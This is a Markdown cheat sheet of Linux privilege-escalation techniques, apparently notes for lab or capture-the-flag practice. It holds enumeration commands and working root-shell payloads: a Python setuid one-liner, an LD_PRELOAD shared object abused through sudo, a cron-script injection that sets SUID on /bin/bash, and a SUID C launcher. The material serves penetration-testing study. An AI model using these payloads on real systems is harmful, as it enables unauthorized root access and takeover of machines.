

## 🌐 Main Resources

- [GTFOBins](https://gtfobins.github.io/): Unix/Linux binaries that can be abused to escalate privileges.
- [HackTricks - Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files): Techniques for local privilege escalation on Linux.
- [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh): Script to automate privilege escalation enumeration.

---

## 🔍 General Commands

### 🔹 Find SUID/SGID files

```bash
find / -perm -6000 2>/dev/null
```

> Lists all files with SUID/SGID permissions. These can often be exploited to run programs with elevated privileges. (chmod 4000 for owner and chmod 2000 for group)

### 🔹 Check sudo rights

```bash
sudo -l
```

> Displays commands the current user can execute via sudo, with or without a password.

### 🔹 Check Linux capabilities

```bash
getcap -r / 2>/dev/null | grep '/bin/'
```

> Recursively lists files with Linux capabilities (e.g. `cap_setuid`, `cap_net_bind_service`), filtered for `/bin`.

### 🔹 Find files belonging to your group

```bash
id         # check your groups
find / -group yourgroup -type f 2>/dev/null
```

> Search for files owned by a group you are a member of.

### 🔹 Useful directories to investigate

- `/tmp`, `/var/tmp`, `/var/backups`
- `/var/mail`, `/var/spool/mail`
- `/etc/exports`
- `/opt/`: often used for custom applications

### 🔹 List open ports

```bash
netstat -tulnp
```

### 🔹 Port forwarding

```bash
ssh -L 8000:127.0.0.1:8000 enzo@10.10.11.68
```


---

## 🐍 Privilege Escalation via Python

```python
python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> Spawns a root shell if the script is run with root privileges.

---

## 🔗 LD\_PRELOAD + sudo

### 🔹 Exploit example

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void run_me_first() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

**Compile:**

```bash
gcc -fPIC -shared -o exploit.so exploit.c
```

**Run:**

```bash
sudo LD_PRELOAD=./exploit.so /usr/bin/ping
```

---

## ⏰ Crontab 

### 🔎 Where to look:

- `/etc/crontab`
- `/etc/cron.*/*`
- Systemd timers (`systemctl list-timers`)

### ⚔️ Exploitation Steps:

1. **Identify a writable target**:

   - Check if you can edit a script or file executed by the cronjob.
   - Use `ls -la` to inspect permissions.

2. **Inject malicious code**:

   - For example, add a reverse shell or privilege escalation payload to the script:
     ```bash
     #!/bin/bash
     chmod u+s /bin/bash
     ```
   - This will set the SUID bit on `/bin/bash`, allowing root shell access with:
     ```bash
     /bin/bash -p
     ```

3. **Wait for the cronjob to run** — Check the timing configuration of the cronjob. Crontab lines follow this format:

```
# ┌───────────── minute (0 - 59)
# │ ┌───────────── hour (0 - 23)
# │ │ ┌───────────── day of month (1 - 31)
# │ │ │ ┌───────────── month (1 - 12)
# │ │ │ │ ┌───────────── day of week (0 - 7) (Sunday is 0 or 7)
# │ │ │ │ │
# * * * * *  user-name  command-to-be-executed
```
---

## 🧬 Crontab → SUID bash

```python
os.system('chmod u+s /bin/bash')
```

Then:

```bash
/bin/bash -p
```

> Runs bash with root privileges if the SUID bit is set.

---

## ⚙️ SUID via C binary

```c
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

> Compiles a binary that spawns a root shell when executed with SUID.

---

## 🧱 AppArmor

- Check AppArmor profiles and restrictions in `/etc/apparmor.d/`

---


